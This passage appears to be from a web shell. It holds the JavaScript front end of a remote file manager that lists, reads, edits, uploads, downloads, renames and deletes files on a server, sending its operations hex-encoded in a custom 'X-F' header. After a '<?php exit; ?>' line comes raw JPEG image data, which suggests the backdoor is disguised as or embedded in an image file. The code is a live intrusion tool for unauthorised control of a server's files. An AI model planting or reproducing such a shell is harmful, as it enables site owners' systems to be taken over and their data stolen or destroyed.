    return await timedFetch(location.pathname, { method:'POST', headers:{ 'X-F': payload } });
  }
  return await timedFetch(location.pathname, {
    method:'POST',
    headers:{ 'Content-Type':'application/x-www-form-urlencoded' },
    body: 'f=' + payload
  });
}
async function fmJson(op, params) {
  try {
    const r = await fmCall(op, params);
    return await r.json();
  } catch (e) {
    return { ok: false, error: e.name === 'AbortError' ? 'timeout' : 'request failed' };
  }
}
function fmtSize(n) {
  if (n < 1024) return n + ' B';
  if (n < 1048576) return (n/1024).toFixed(1) + ' K';
  if (n < 1073741824) return (n/1048576).toFixed(1) + ' M';
  return (n/1073741824).toFixed(1) + ' G';
}
function pathJoin(base, name) {
  const sep = (base.indexOf('\\') !== -1 && base.indexOf('/') === -1) ? '\\' : '/';
  return base.replace(/[\\\/]+$/,'') + sep + name;
}
function pathParent(p) {
  p = p.replace(/[\\\/]+$/, '');
  if (/^[A-Za-z]:$/.test(p)) return p + '\\';
  const i = Math.max(p.lastIndexOf('/'), p.lastIndexOf('\\'));
  if (i <= 0) return p.slice(0, 1) || '/';
  return p.slice(0, i);
}

function fmRender() {
  const tb = $('#fmTable tbody');
  tb.innerHTML = '';
  for (const e of fmEntries) {
    const full = pathJoin(fmCwd, e.name);
    const isDir = e.type === 'dir';
    const tr = document.createElement('tr');
    tr.dataset.path = full;
    const nameCell = isDir
      ? '<a class="fmLink">' + esc(e.name) + '/</a>'
      : esc(e.name);
    const acts = (isDir ? '<button data-act="dl">dl</button>' :
        '<button data-act="view">view</button>' +
        '<button data-act="edit">edit</button>' +
        '<button data-act="dl">dl</button>') +
      '<button data-act="rn">rn</button>' +
      '<button data-act="rm">rm</button>';
    tr.innerHTML =
      '<td><input type="checkbox" class="fmSel"></td>' +
      '<td class="name">' + nameCell + '</td>' +
      '<td>' + esc(e.type) + '</td>' +
      '<td>' + (isDir ? '-' : fmtSize(e.size)) + '</td>' +
      '<td>' + esc(e.mtime) + '</td>' +
      '<td class="actions">' + acts + '</td>';
    tb.appendChild(tr);
  }
  $('#fmPath').value = fmCwd;
}

async function fmLoad(path) {
  $('#fmStatus').textContent = 'loading...';
  const r = await fmJson('list', { path });
  if (!r.ok) { $('#fmStatus').textContent = 'error: ' + (r.error || '?'); return; }
  fmCwd = r.path;
  fmEntries = r.entries;
  $('#fmMode').textContent = '[mode: ' + r.mode + ']';
  fmRender();
  $('#fmStatus').textContent = fmEntries.length + ' item(s)';
}

function fmGo() { fmLoad($('#fmPath').value); }
function fmRefresh() { fmLoad(fmCwd); }
function fmUp() { fmLoad(pathParent(fmCwd)); }

function fnSummary(r) {
  const list = [];
  if (r.functions) for (const k in r.functions) if (r.functions[k]) list.push(k);
  return list.length ? list.join(',') : '(none)';
}

async function fmHome() {
  const r = await fmJson('info');
  if (r.ok) {
    infoShort();
    fmLoad(r.cwd);
  }
}
async function fmInit() {
  const r = await fmJson('info');
  if (!r.ok) { $('#fmStatus').textContent = 'init failed'; return; }
  fmLoad(r.cwd);
}

function fmToggleAll(cb) {
  document.querySelectorAll('.fmSel').forEach(x => x.checked = cb.checked);
}
function fmSelected() {
  return [...document.querySelectorAll('#fmTable tbody tr')]
    .filter(tr => tr.querySelector('.fmSel') && tr.querySelector('.fmSel').checked)
    .map(tr => tr.dataset.path);
}

$('#fmTable tbody').addEventListener('click', e => {
  const link = e.target.closest('a.fmLink');
  if (link) {
    const tr = link.closest('tr');
    if (tr) fmLoad(tr.dataset.path);
    return;
  }
  const btn = e.target.closest('button[data-act]');
  if (!btn) return;
  const tr = btn.closest('tr');
  if (!tr) return;
  const path = tr.dataset.path;
  const act = btn.dataset.act;
  if (act === 'view') fmView(path);
  else if (act === 'edit') fmEdit(path);
  else if (act === 'dl') fmDownload(path);
  else if (act === 'rn') fmRename(path);
  else if (act === 'rm') fmDeleteOne(path);
});

async function fmView(path) {
  const r = await fmJson('read', { path });
  if (!r.ok) { alert('read failed: ' + r.error); return; }
  $('#modalTitle').textContent = 'view: ' + path;
  $('#modalText').value = r.content;
  $('#modalText').readOnly = true;
  $('#modalStatus').textContent = r.size + ' bytes' + (r.binary ? ' (binary)' : '');
  $('#modalActions').innerHTML = '';
  $('#modal').classList.add('open');
  $('#modal').dataset.path = path;
  $('#modal').dataset.mode = 'view';
}

async function fmEdit(path) {
  const r = await fmJson('read', { path });
  if (!r.ok) { alert('read failed: ' + r.error); return; }
  $('#modalTitle').textContent = 'edit: ' + path;
  $('#modalText').value = r.content;
  $('#modalText').readOnly = false;
  $('#modalStatus').textContent = r.size + ' bytes';
  $('#modalActions').innerHTML = '<button onclick="modalSave()">save</button>';
  $('#modal').classList.add('open');
  $('#modal').dataset.path = path;
  $('#modal').dataset.mode = 'edit';
}

async function modalSave() {
  if ($('#modal').dataset.mode !== 'edit') { modalClose(); return; }
  const path = $('#modal').dataset.path;
  const content = $('#modalText').value;
  $('#modalStatus').textContent = 'saving...';
  const r = await fmJson('write', { path, content });
  if (r.ok) {
    $('#modalStatus').textContent = 'saved ' + r.bytes + ' bytes';
    setTimeout(modalClose, 400);
  } else {
    $('#modalStatus').textContent = 'error: ' + r.error;
  }
}

function modalClose() {
  $('#modal').classList.remove('open');
  $('#modal').dataset.path = '';
  $('#modal').dataset.mode = '';
  $('#modalActions').innerHTML = '';
}

async function fmRename(path) {
  const oldName = path.split(/[\\\/]/).pop();
  const newName = prompt('rename to:', oldName);
  if (!newName || newName === oldName) return;
  const to = path.slice(0, path.length - oldName.length) + newName;
  const r = await fmJson('rename', { from: path, to });
  if (!r.ok) alert('rename failed: ' + r.error);
  fmRefresh();
}

async function fmDeleteOne(path) {
  if (!confirm('delete:\n' + path)) return;
  const r = await fmJson('delete', { paths: [path] });
  if (!r.ok) alert('delete failed: ' + JSON.stringify(r.failed));
  fmRefresh();
}

async function fmDownload(path) {
  const r = await fmCall('download', { path });
  if (!r.ok) { alert('download failed'); return; }
  const blob = await r.blob();
  const cd = r.headers.get('Content-Disposition') || '';
  let name = path.split(/[\\\/]/).pop();
  const m = cd.match(/filename="([^"]+)"/);
  if (m) name = m[1];
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = name;
  document.body.appendChild(a); a.click(); a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 2000);
}

async function fmDownloadSelected() {
  const sel = fmSelected();
  if (!sel.length) { alert('nothing selected'); return; }
  for (const p of sel) {
    await fmDownload(p);
    await new Promise(r => setTimeout(r, 300));
  }
}

async function fmDeleteSelected() {
  const sel = fmSelected();
  if (!sel.length) { alert('nothing selected'); return; }
  if (!confirm('delete ' + sel.length + ' item(s)?')) return;
  const r = await fmJson('delete', { paths: sel });
  if (!r.ok) alert('some failed: ' + JSON.stringify(r.failed));
  fmRefresh();
}

async function fmMkdir() {
  const name = prompt('new folder name:');
  if (!name) return;
  const r = await fmJson('mkdir', { path: pathJoin(fmCwd, name) });
  if (!r.ok) alert('mkdir failed: ' + r.error);
  fmRefresh();
}

async function fmNewFile() {
  const name = prompt('new file name:');
  if (!name) return;
  const r = await fmJson('write', { path: pathJoin(fmCwd, name), content: '' });
  if (!r.ok) alert('create failed: ' + r.error);
  fmRefresh();
}

async function fmUpload() {
  const inp = document.createElement('input');
  inp.type = 'file';
  inp.onchange = async () => {
    const f = inp.files && inp.files[0];
    if (!f) return;
    $('#fmStatus').textContent = 'uploading ' + f.name + ' (' + fmtSize(f.size) + ')...';
    const buf = new Uint8Array(await f.arrayBuffer());
    let h = '';
    const chunk = 8192;
    for (let i = 0; i < buf.length; i += chunk) {
      h += Array.prototype.map.call(buf.subarray(i, i + chunk), b => b.toString(16).padStart(2,'0')).join('');
    }
    const meta = hex(JSON.stringify({ op: 'upload', path: pathJoin(fmCwd, f.name) }));
    try {
      const r = await timedFetch(location.pathname, {
        method: 'POST',
        headers: {
          'X-F': meta,
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'u=' + h
      });
      const j = await r.json();
      if (!j.ok) {
        $('#fmStatus').textContent = 'âœ— ' + f.name + ': ' + j.error;
        $('#fmStatus').style.color = '#f97583';
      } else {
        $('#fmStatus').textContent = 'âœ“ ' + f.name + ' (' + fmtSize(j.bytes) + ')';
        $('#fmStatus').style.color = '#7ee787';
      }
      setTimeout(() => {
        $('#fmStatus').textContent = '';
        $('#fmStatus').style.color = '';
      }, 3000);
    } catch (e) {
      $('#fmStatus').textContent = 'âœ— ' + f.name + ': ' + (e.name === 'AbortError' ? 'timeout' : e.message);
      $('#fmStatus').style.color = '#f97583';
      setTimeout(() => {
        $('#fmStatus').textContent = '';
        $('#fmStatus').style.color = '';
      }, 3000);
    }
    fmRefresh();
  };
  inp.click();
}

async function boot() {
  $('#out').value = 'loading...';
  try {
    const r = await fmCall('debug', {});
    const t = await r.text();
    $('#out').value = t;
  } catch (e) {
    $('#out').value = 'boot error: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
  }
}

boot();
fmInit();
</script>
</html>
<?php exit; ?>
#%$""!&+7/&)4)!"0A149;>>>%.DIC<H7=>;ÿÛ C
;("(;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;ÿÂ ,, ÿÄ               ÿÄ           ÿÚ    óX¬VZ…­6O%®` Vˆ1ß]N€J X)
 ÅD…¢9U—N[^D¸Şªogµ´¤ºtÍ® 6<—8Öé‚ûE	J
$-ªÁ@Ag1Ğx*½qOe‰£]®½í×YZŠ3ÒŸ?)v•^yóåLŠImÆéá¥Ûö
ŠW@ Q.Ç’÷kèMw®Íú®Òl´¹ó×åº{ÉöÜ?%9ó
AZgŸeòsF-  !Á@Dî/œs=Üc}6k¦™Êıú®° ©ªæ©ÂÍš"z¹±Â3Å9ó´×<¹/©.™ç…İ.® Ó|ÚóïÏ©^¼}ñÛÛØÖ¶•¬ @9!u6\º®ôæòñÕYÓŸ;ÙEì 
A@HÎ‹çäzá¾Mæt}œîëµk*2
ÀJXf;s7ÎãóR GÍç½ÕŞ„ ¨³Ç³=(3®„ógéëzÛG™f=:»ê[­ "®”µåe†®|bÍ–ErgcÍ{wb‰ME(M„ùüËô˜E³ŸGldõyh×¢ZÔªDg6TmK	Lâİ‹i›Ë-ˆ€¢k>|¡ªyrßS„…¢u'Îæ_¢”‚·ãÏ°ÖİÂH´ìKN%»ªWŒi¼óº×Ï¥ÔÎ=/M–”ºrùx!9€8TGAáÉ}5:6mœ¥q–zŠ$¹ºï-û]³¤‚5„«"ªçcÊU®™†¹Âò¾õètõOW<˜1ä†yXÄ¤iyäÎKêC›çs_AZ ĞÇ=>Ÿ©W=Og«fÍÚ¹jm3W•{ó‰ÙÇMØ˜78»Æ§§~íyØå›7"´Rƒ¡<8ïª¶ÙÑŸ?œú R‚ºîvúù¹éÉ'Jyæ¼ó§\+×±¹ÙÏg¶:».¯é®¿oqo?ócÀJ NŒğsoĞÛ<t;Rì vu>Şns=óÆó¯\l^Ï>…å+œ³¾kœ½Ìs%¡¿+Û[¾¾…½uÏÇøñˆ(P9:/ŸÍ¿G¥>6ı ‚ĞsRš†¹„ó»cc°åxW½÷Í©|oVé¾7?Nö<×^|>“\õu:ï•œåÏ”BV…©# ğ`¾ŞŒğóoĞ‚Ñ·ÏR›ég:˜ÉuæzOiÊY3¶ıŸ.>K§£™®}|ã±œğ:fs\ËÖÇN¦½Tîóyø @È”²ùÆ×;œ¹·Ş@U“åõ<ªYÌÕ¬øş}<ôó®væìâ«<·MæÓLÎK»n´k±ÖçuõÆx@µ¢”¢:sç%æß¢
@jp¥ÛÓsÇK:¬Î¸u·xzf¸5‘µn‹½—ZîãzÕ¾™øéãô˜óóÀ” $- =óü÷Ğæ¾c„¥„»\OW¥Ær^vNªç5Ç3]"ÔÓUŞ½tÖÜ¨‡J·Õc6Lâ½psù€H)`
ê§æ8ï­Í¿DA@AvgÍV½g9í¦í·^·®ëMÜ„ šw!LéGNµó–jUzó8|§H  °R=Có\—Õæß EB†‰ÆıuÁ-“[·½šÖ‰¥ID*eKy÷Ş®RíÈİó8üè0A@ vçÇÊôs¯ÑE³w 9Ûëz×,t:Ë5¸ç´Ä@¹ª7Ö¾rÍ!­óùùc9s	‰\ékÜy·è†‰çÏ{,ÙÑ®^ŠqÃ¤áw_¥W>5©ÓE¼øO¦«ÁéuÉË‘x«sç”'0 ½Â§]óÃÏ¾ôQsŸC~§×ÛÏåæ3àìkwkØ† *+›ÅÏ­yÍİ÷O<èêw\ş\sçÄX(ÎŒùü×Ñ¶òÓ8a¾ÀQ.˜ß¿TºûpsáŸ+&z-jéì¶Æ€Z3Ó.‘”¸»¾ªç4tZÃÏ\øH(A@N”ùüçĞUÓŸ;˜úE 	dÎûŞÎşü\ùåçóËusNıõ5ôÅ·0šË™ùí]Ú×•ÛÌ·¬\ó“<%(/œ-rÆö¾xrßUS VLëoGn<ë'/œ[«•ú.I-š‰aŠ
ÂU¬İÖ×›vùÏ¦ñòå›>h9Qu'Íåß¤E®uŞ–¸Ôì‹&u¯ĞÏ+Gô¬Ëf›¨1 Ä¥Ä·Ò8å§Ñº³*Ç
uÊÌ°YyêlpGÍå¾‘B…ùç·]Ÿ_£›Ÿƒk•ºõãÇz¹š€ NÍ=2÷¬\d·Ö8ã«Ñ¼ÙÍ|¼¹/FÓ Â:™Ë¿HR¬˜­¡zSçá{:ÛÓØI+ÒMWu{›ÎZåÏLÜ¶‚%d«GLİ¬iÒœ«nÇ×¶n*;öU<ÀFçŠ—l÷°¤…¤…·Î=m¥¯¢ÄÕß©×KŒ’R%ÁË­<ôÔÕ×ë%È°›ÇOVÛË<é“Ê½ôÏ(šopÁ}À!Jè8jß²û§v-sYâwrfÛ‚±óÛ.ÖlÔ•ËT3yscxìÖ©Ê¬ùò·,ø—=î €cMŒt÷ÕkÖ “XK¥©-÷œ‘V¤â$éIªsh’vh²uTÔ§“ç‡° —¤ñîíõæ+$²H5Ÿ=—¹Í”°XË*!Q$´!.lêU7+­@•ºrqå«<IKl¦œ½q·§ÒbP Ic.wK.fËFµ,†AdŒ1LÓ-×)¢iŒ¥®V<Õc‰` F¹çêuö½zPFæqèÏKõÍ ¡\YE)D`U7NVë•×P&4*§N_?%9â ¢u'“_o² Ô@ ŠˆYNwÑ¼©RI¨@)«Æåe·:pÈk›=ó¸Gnù§×ë0¥”Ód´’4ŒÖv¬bİfHK%¤
êUM2LÎâj"R¥3§+Ÿ†·/ÿÄ +       !10A"2#3B$@4ÿÚ  ù<ÅÒÚó‘RN-"ÏsXõç¾¶{Û'»ÌçiÌáÒ4ölcÔõÿ èJÃÈª©îø#Ûcí‰ÂÓ§	É–ş"jíYÇ¦º>‘Àÿ Æ¨]¹5Q,Õ;š
D'	œp˜ĞwaZÕn„±ë<ê¯–é™ş
tæÈÚ…­OrªZ-@@„Àƒ¦Á üvó3
ôÕ{ÔMuêC‡åR]{Û²Ô¸â+äE½ŒNüBqÂx‡/¾0>»äÖ:eÜN@Œœ;ƒeüÕÚ”Gk+5?Á]kJ7rŞq`œSÏ_ïCƒ³ëÃÕU«jÛSRÿ ª-¶µÌãœæ©œüî¹:ªqz:ß¯OO5¯¿šûÑXàç0œ÷áç>ÌÛ|ñ¶`ğFcT¤òV{tİ!Ó¬tÆÖ\Ö¥Bí¨aZn©Å-ÑÈŞ{h)Ààï‰Ó06F;n¶6c9óÜÏs=Ìk8·j1OM?ÁGŞõv]ÉíÒbÃ/Î`Šr#Æ—V–ÀÄ5Y²¯YXKo»šwZø‚®=¶ÌûÌ&}ç¶a"sg0ÂìvJøâôöb1â=KW6ÛÎÑüTt§ëôwû„Î)Æ6L“–5z]Ï=Š™ê:U£jò>‹~#âÇN[Ï3Wø”ğfg/ˆl¹39IßEg+WêOj^PS-¯§ÕhéE8o Ë|uçWùm¤^-E¯Ì·¥YB›!h_±rvDk¯Jµ¦¯M§¦IqÎ>Ÿy»S¦m3èôU[§÷¡‚½-ÅÊÄ¬æ¹oÂŸÉ¢šÃOÔ;Äî´z-­}9ø5¡YnÖUHE¿I§šûn©,±­m>¯“§ô¦âÓÌY9³ÕiàÔÊsâà~şb0[ñĞuúeU\õú]¬}’„¶ÚôƒÔ«¾æu}=Öµ/m¬š5šw¡£[£m3ÏM·—¬ÖkŸOmšÛ¬š_¸¦!Ã‡2áÛà¥¸nÕF§µ]L;z}¢]fÍB&—ş0iS©k47óÍ¤û\j­«[l4T‡QB6©k]B’­¨½µA[˜(œ E–7ñü:Äã·[ıXÎ‚Í>¾Ëµ5Ujki¦½÷z}(õ%Ô0Ñ\« ÔzŸÔê+].«Pu7LîbéìhºA´XŞ#O«~.4×ôuQİ'§^Å-×]Íõ$ÛêV×z{ç:l ñt®béP@¡zÄààã·ÃOôk¿»«Oû\¸³I·ÔZüË^Æ}–·xºF‹§¬Oİ¼“‘Ş8ø«8§Wß®“ü—ŒˆŒ],ZQz¸gèo}¯‡û|?.]ùhö(Á7C†/YœU®8‘§ÎbLƒğ‘
4å¾@ 7‡R[”ó–ğät:·\¿‡cnhİGr!£_æ
fr;…á=dâ§3·;¾xŒø"øoÌfâ=ÕÍ´Œ6ŒåüuUı‚ùªÎ[+‚>lF|íşO•àÒş	+~]š´á¿¦¿ìÌ>-Ù­İƒƒÔÖLça?Ïú_áüõÙüz=Ÿù´})û>­ıv-„Epv'¬ÏGßùÿ Iàøìê¥9–êŸı´‹,C]	û×ûK?]†Ãn2!bz~ş¿ÒÃáü·íÓOğéö±o,µ­;`pŠ”Z¬,Q¹Ï3Ä8àğFÜ0üdNsÂäÂsÓZ,Õ8/µŸôÑĞª]QH‡Ç$»%
!©c¯X‹\a³m¾ºşm>êì›Ò©}B¶,´rp“2gc8p,tèÉ™h ™À³„GY˜Ñpc‹ƒõßOPcu¦ë:ªşŞäğ™ŞÛ#;×¸ØŒÇ]ÀÌTèa˜W* pe©+úmM&çÔZ1ÔšqÂ´¢t6fFsˆ '†yŒL,ÙZç-` t³Ìç,aËà£Ç%4µÏw(0¹Ö¾¡Ø×mùÌü¦HØªã€NêC˜=9ß=öÀ†µ˜œN"~@.#&f?Šõ­Á§\(§;Ä;øÄÌÈØt¯o±á×!×„õ’N&v"x í¼AÕŞ6`ƒÎßQÓ1Ğ¯VrıglÆÄ;glõ—ö‡Æî¹¼'£N1_ÆÂ¿¾öÌÎÇa·ßC !Ó‡¡{&ß[ş¡‡öø'Â÷}ÁäyÛìlñ»4ÿÄ 4       !1A"02Qa#3Bq‘$ğ@R¡ÁÿÚ ?ó+NSñ·ºüLÏûqÿ *Üc¹ /ÂHïT…~ÜWöø~Wöøû¿OKÊèbG¦E~-œ´øæ¸Ò%d“æ.Y™ñø™¥û-ıÊ;÷™ÕL†6zFt%tßì‹ì°Í«tö*L/àQY‰‡Òn
<k…şÿ ïk\W^Yö„P{¨ğli¹Ûœ®ì›İÎÉ°±¼ Z8W…pM!µPcÜ'aÿ êˆ-4:$’
<.„Ğo	¨öPâÚóiØë>Tø¦Çá¹3
éóÿ  œd.xñlC#ô¢ã¦2¸	¾ê«gr¤„·q¦l3%õ!,¸cIwoºkƒ…Gœà\(Ò¡Ã6ûä×>GÚÁü¡ŒÜíÑ”£)­ @mº¢¢µZ†Èªm•Û¡!	Ì5]!îº#İ>EFDlTxn“ªÓ·²­rI#4UE(•µL²ºgt¢ıÊÁ45ö§¶»'Æ[Â…•uÅrƒU5r­TE«ŒšTÑXj8Õ,‰İXp¡™³6áåb%sİĞ‹ê[mj<‚šëš	¡SXÕL¨ÚáCªhİºÑşáG#dmÍĞtb§é6õ†ƒ¤İùÍ®-XŒl—£å	UËªWX•xC}:OœÀãºèµtšºMB©¢Üeˆ›{ë{Ã\V†GCÿ m}ª„¹Æ¤®Êè®’8zU2(LÌhe×ø]eÖ]déîm)›1”ÄáC«õå(
l4;Å 
çLèÈÌñ“wA¥Ör!£„yÉªQGxÈ‰FrÕ‚FŞàÖÜTR™#¼Š,<*ÔÔ ÕÖ¦aüwUG.
ï—’¨Úˆ£+âdéîù6;…j‡¤.SİÓR¾ó]nšÙCåAD‘]ŒGÕ™°şçT_sùC„ìÏ9U(º¬eSñ$ğ‹ÜyMi&R6òkú&ÉwÛoÿ SÛœ°ç‘åb»yÖU—·–¨ŞÀá‘ n°bòé}Xsõ×täîB>åC	ø‡;„\O(1Îã7pº=MÂ«³E{}Âë	ŒÚğQAbxAå`‰mĞÙc_d'åBÎœaº°í&t#÷NsZwOœRä(š¦¶¥R6òjŒÌw„¿!X9%:ßÊ„£„Ê¼V´ïeôÙÎÿ øº¦íğşˆÆ.®@Õ ­–+äÉôñMwı¶Ëãš8ÿ }lu¦¡:W»¾mîà'2ÑÊr6Õ£…)·ì‰{¶V	Lm¨‡l¸rAÇ‡ışS¬îêªÔe«Ab+±òqíúWÈ…S|XÇaä	8_M¼š£ˆ «Bs¤Tn˜ÊïZ'7°M{í£B°ğMƒ{[.7''D~cTÊ²ŒÑÈ¶‰ûÇäÎÛ¢pX3tXMä‘ß:ÁÜ¢¬,õ¡cOƒ„Ù*Ibhsöà£Œnƒ_ÈV°rkşÿ (ÁŒgdg¡½¿ø¯ñEEsa(AîŒMoğ¤Ú?+%±–ü¬¡Çç]i*<&Ã)Œõº|‘öØ©-Ô!X9iN44T{×PF¦O aAP&ó“—
aXëå_cÜ>Wôï³ûë›g>/¦kRQñø)¯…9§n@{+
°*{h'‡Ó#ÊÄ}ç~«úÚ?®¹øMô‚Zl…iºkxÊ…tÕƒM3rœ2nãÊ•·Jãò°;^ßs
xFA+§î­ªªt‚bQçÉ‚>¥ÎùPxq271#K‹k¸ĞáVÑa¨ÖQé¯Œ'LÛ“\*Õi]é•Uu…xNpUMåM¾¡tİìºOöNinÇIãeƒ§7Oğc}ÆbLdĞUBŞ ªl*x­ÙG?DØBQHÛİrïäÕ9´¦œÊ*l‚™ö®¿Âü)y®™åé0½4ÔT¬p£['±@×qªOIXMãC•‰ä)#¼(&üçÉª=5H» ¦Ü#ãs"÷ÊXïŒµ`Ÿt_¦Ú¤ô¬Ñå‰í“ØÊ‰Î³TA¹¹3…"&ò¤Ş£ãÈ‹êâ\ÿ m³gÒÅöv©=%awŒå‰ôŒáû‰Â¡ZˆÈ
 4Ôä8C”~å>5Ï'J2åƒ§÷9ãXK/o-QH$`pÒïJaÜ¢uÌb=áıy­ÔS“xC”óI‚”QçV#ëLØ{ÎqH$`pGu-ˆQ¹·wÑ8Óaá~‡b¥mµŒp˜òÆÚÔùŞïèµZ™YÇ‘TxN;¡²Ñ…Ê'İ+¬äç—:äãvçL²Ø\V2Ôw.Î?ñ¦éŸIãMÁ®SBçÉ{S7X§†È›İëM¼»êª%4®Ëò§å>Ñ„ôÏ¤iù3X=-Ğæ5ş¡œî|u?*26—U1q­(€V}E½U€¦Ë…RªP5h4U*¥Â§Ğò˜ AŒæŠSâ¨Rci£9hé³ÔTˆ™n¹½Q`á`mJ%l‡(¡‘Ì$èi¢ïTğªˆ½´Rò¥ûmÎy›*VVOQÖ×:I-o	ğµÉ­ŒÂ®ô(j4 U¢©Ô OÛ„çê‚»§^-áL“Z¡ô£”ó¶Ô¬?T¶²§@Ç>óÎ²6U´Ú°Åïm^¶ÑÎÈ9r­!òjW<¢ĞDíEøhoê8nŒ25×“·“/‰áh¦°PNÕEMN]“r( {,Vi9AU„mÏ/:©˜(|¢)¢™ó¯…Ê¥3­E
–+MSº¢Ã2È‡Î¾Vã ¹TĞ~<Bäte4v´È:’ùtU(êºë•
áí—} ö*Xmİ¼hÃï>CÔV…LÏ¦¨n*¨†a7#Î¶)@kè2ÿÄ %         !10@A"PQqÿÚ ?şá‹ú,Ò¶6'Ë ­>âWØ•neT™ùt.J¯c²F­ïóúWE¼Q¤Ğ8ú?G&˜¦ˆ®oÉ[$½9ç‘—EyëÔĞ	øª53Q)´é26ü-‰áÅ3J4£J4¢J¼ÖQFƒHÿ ;4	l²óc\s³Q¨Ök5_›îïón¤»ê¾äú4¶EÚËïÑú(nlíT?ĞÔ#A¥arèŠ£àİúQìøK?PÇ8àõ1@¤>9ËdO2ñW‚=âEô?Ö(Öäio±GY|‘¬Á]jñ?JÒäªø9JF‘Eaº5‘»ä™¯‚.É7eğè_î!ÕKÒ|šVm!JÉu„ù4‘ÃDó%âçÃ3YË"Ò(¬EÙDe‰.Å2„«*CëÓ—EıÅS"×Â]â,«4Šë	V Ip#ç¨ÒEœ±FÈ±®EE‰Vi”P±2‰z’_DˆTW;(¥µbH¡®='†¬­”WŠBôÙó:J^Yë¿FDkéÁÓ5!xßbë²™¥ú“A$EÖ%äKÂå†èJÖ%Ø¥F±»ó2b}á?¡Ë	ëÑdTë‚ïscxBè‘±.ıC¬K+
Bw—-ˆ]²b]ùŞGÂ=ë+f¦7µ%ÙK¿Cé¥|h”Ş/ÃCK	!®,‹53¾|KoÓK.Åô¤4=Ô(lGÂ]ôR²ŠÛH¤8í¶E2°Ğ›$È”‰?b¾ø™%švµ±ù%!xíšM+ÄìjØíxî…¶ŠÅß–Û9Ù¥x«ÖbÖ¼õŞ>îk|x^EåO{U·ï­^F¶C½«bØÈå¢øİô~.qÿÄ 4       ! 01A"2Qa@qBR‘¡#br‚3CÑÿÚ  ?ÍÙëõ#f®G¿İpøvıU!°}Ãö\­û.(,+‹ÃËØª=Ì÷S†ö¿ê¸ÚG¨àl×ëD™ùZ¥guÄâmĞ­‰Ø(¥;Ãºâo”z…y„DooI&‰•8ænùºÎôÕQ«K4±İì¦±ÒRŒÙ;ç
ğâgQèouƒusÃ‰~å[:ä“ÂiÑNşU"$s¦[{²èÑ°²®¯@¹"å’Ó–¥d¤µ\Ë™s[1DØ‡Åm×>éÙ]vOúµ#`Êdë†{bòcWtW]•çÅåªó‘“éü˜¦¿•×m‘7QÔªQ£AÑbQƒò©%²ÙN”U–Q¶kuºİn©`½*oŒ4jPğğôİğµ­ácv\Ë™sş¯eëƒ•rşW/årşQ¥¢+]0uíˆÇ<ÆS8&†km5Ì0ŸÈôXv´º¸ïd$.µº©MNßt-­ÕRx9¤¥9ÙË^Vì›ÃÄ58sFâ8FV‹U *¦îİ~¤[Ç²lH|²HØ2<·r¾ˆ´íd“ „Wµ¶õ´È[ÇIÉÌÜroøş:{«¾$µµ‹ ÎéªŒ‰„ÈÃãÕNwS‰³;)YKn´L®3p.Ş|Óá˜ÖPPkåQ5çÄy”Ô Á1w*q£C£Q†×9Ï—1)ğ	Ş¸KÛ»ì´†F¶Ğ ç°€S;Ñ8¾,ÚíŒ(PÜbª\:õ*ü>UyÊ$-œ¢B‘U¤Oïº‚ÈMßª¿´K$¤ònŸˆIÑ4|îÈˆÈ‚|4\|º¾ò\!¯İ1Ásh¤ê9¥3Ä½³è˜ïÙŞ_©ñUB4ˆÕÕ‡C`>ˆÃ]\¡°êËÉaî ·öãiêƒ¤ˆQšö–ƒÊJò#:}ÂácauF4FÊüA"î©¬0‹äd:.'C¶ª	Ôƒ%
fÏ…yw™Ã}“„.TÙ_wIY¢©û*=òƒºµ0tn?bšñ±šh3ºTCÿ '(—¢Ñÿ 
¹É5ñ º>UPf÷
/ppuUóôU3]V’÷\Fj´/uí•şĞ¿®7‡‡t:¦d+4E0Â£\'  Äo4ªÛ‰)O[(	U¢¯ –9£•ø¡üq•î„DçüÆh^:YÂÕÄé-'ïl×2ñPÕ™éf‹‰ßeFâ©Âpœ–7ö…İ)hq: £ZE®ªEjµÊ+E¥º.UÊ«„MM†bIãätí¥¡œğIj¹—Uyj¹–¹&Ah´·EÊ¹Tğ†hˆ	Ğşv©b;*ièDX½¬kºz:¸…¢Ê@}²ÍßSk_ñC¡Äºá©“ôÆÖ#-·Êú"Ã¶¿¤iGãnhÛKÖMÚÚ,˜FKe_@îÖÏ`İmåe-óG;9°Óª6v_ú´Ë8]‘şÓ¶i‡ "U)UUÇè¿Øäk4ÛUW(\¡S¥T­Ğ*`Ğ'!ƒÌ#ãôÅe-ìæZäÏ5É¶È}J¡ò7ó‹UL2?u,4Ëª¥“ªªÓr¥A¼Ñ†Úÿ ëøU³OE­Í†Šàá Æû»&÷\ùıÖ˜Å„wÌ’Ç/Dl8;bŸL™[%\Ó˜g×*¶÷ô´À=“²OÿÄ (        !1AQa q‘¡±Áğ0ÑáñÿÚ  ?!<˜<õÆ‰6„¥ğ.òT›íÜ0Xå?ö"!Æ‚Z?©·78Ê0ş 2òkÇ^4±Çfç‚ì¢G·U—&šKiùG,°l¼	ğô&ÚZèG.%fGáMŒƒ.f¶œëšÿ 
£®Â‹ki«(©È•Íˆ¿À,gäk4º¦£× %ÒˆFĞ×DŒg2åbé³Ñ^¼ˆ÷Iÿ %{±››Kc8H¬İÉT°Kè˜¶’2b„‘bqª®›˜É¬Æg«­ìÆ×‘túü“Æ“Ğ¥»$OikGæíª«V‹ËTîcëÉ$¤ªÆ¬–Qü‚$æ%(ScFˆT¥¨Æ¢Í] ó£//ÓÆ£ôb˜ÙY¢‚ŠáUÔi6Îº(ÇÏVzA:.…¤WÚÇ…VéÉa¹|MF£ak[±â%µYEçG­ŠÔd›¤CzOÑö‰T¢t.ê”´ò‡İå!Ø›sbæÌYRD’à¾Ë×¾,;=SËºùÑRXcRŒ­p_OÇ"Qm2A$’)¹ßâIg¥ØÌŒ3v1v¢™©Çè~¤&2/„´t±
